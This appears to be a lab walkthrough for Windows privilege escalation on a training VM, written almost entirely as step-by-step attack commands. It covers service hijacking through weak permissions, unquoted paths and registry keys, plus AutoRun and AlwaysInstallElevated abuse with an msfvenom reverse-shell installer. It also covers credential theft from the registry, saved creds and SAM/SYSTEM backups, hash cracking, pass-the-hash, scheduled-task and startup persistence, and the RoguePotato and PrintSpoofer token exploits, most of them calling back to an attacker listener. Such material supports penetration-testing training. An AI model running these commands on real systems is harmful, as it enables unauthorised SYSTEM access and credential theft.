# WPE Techniques

## Service Exploits - Insecure Service Permissions 


1. Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

2. Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):

```
sc qc daclsvc
```

3. Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

4. Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start daclsvc
```

## Service Exploits - Unquoted Service Path 

1. Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

```
sc qc unquotedsvc
```

2. Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

3. Copy the reverse.exe executable you created to this directory and rename it Common.exe:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

4.Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start unquotedsvc
```

## Service Exploits - Weak Registry Permissions 

1. Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

```
sc qc regsvc
```

2. Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

3. Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

4. Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start regsvc
```

## Service Exploits - Insecure Service Executables 

1. Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

```
sc qc filepermsvc
```

2. Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

3. Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

4. Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start filepermsvc
```

## Registry - AutoRuns 

1. Query the registry for AutoRun executables:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

2. Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

3. Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

4. Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

```
rdesktop 10.10.253.199
```

## Registry - AlwaysInstallElevated 

1. Query the registry for AlwaysInstallElevated keys:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Note that both keys are set to 1 (0x1).

2. On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

3. Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

4. Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

## Passwords - Registry 

(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)

1. The registry can be searched for keys and values that contain the word "password":

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

2. If you want to save some time, query this specific key to find admin AutoLogon credentials:

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

3. On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

```
winexe -U 'admin%password' //10.10.181.132 cmd.exe
```

## Passwords - Saved Creds 

1. List any saved credentials:

```
cmdkey /list
```

Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

2. Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

## Passwords - Security Account Manager (SAM) 

 The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.

1. Transfer the SAM and SYSTEM files to your Kali VM:

```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

2. On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

```
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

3. Crack the admin NTLM hash using hashcat:

```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

4. You can use the cracked password to log in as the admin using winexe or RDP.

## Passwords - Passing the Hash 
Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes **both the LM and NTLM hash**, separated by a colon:

```
pth-winexe -U 'admin%hash' //10.10.181.132 cmd.exe
```

##  Scheduled Tasks 


1. View the contents of the C:\DevTools\CleanUp.ps1 script:

```
type C:\DevTools\CleanUp.ps1
```

2. The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:

```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

3. Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:

```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.

## Insecure GUI Apps 


1. Start an RDP session as the "user" account:

```
rdesktop -u user -p password321 MACHINE_IP
```

2. Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:

```
tasklist /V | findstr mspaint.exe
```

3. In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe

4. Press Enter to spawn a command prompt running with admin privileges.

## Startup Apps 

1. Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

2. Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:

```
cscript C:\PrivEsc\CreateShortcut.vbs
```

3. Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

```
rdesktop -u admin 10.10.159.78
```

4. A shell running as admin should connect back to your listener.

## Token Impersonation - Rogue Potato 

**NOTE: To make this work, the tokens should be:**

```
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

1. Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:

```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.159.78:9999
```

2. Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

3. Start another listener on Kali.

4. Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

```
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```

## Token Impersonation - PrintSpoofer 

1. Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

2. Start another listener on Kali.

3. Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

```
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

## Privilege Escalation Scripts 

Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:

- winPEASany.exe

- Seatbelt.exe

- PowerUp.ps1

- SharpUp.exe

```
powershell.exe -nop -exec bypass.

Import-Module PowerUp.ps1

Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
 
powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”

```

## Change Configr

```PowerShell
sc config WCAssistantService obj= “.\LocalSystem” password= “”
sc config WCAssistantService start= “demand”


Set-Service -Name "WCAssistantService" -StartupType Manual
```

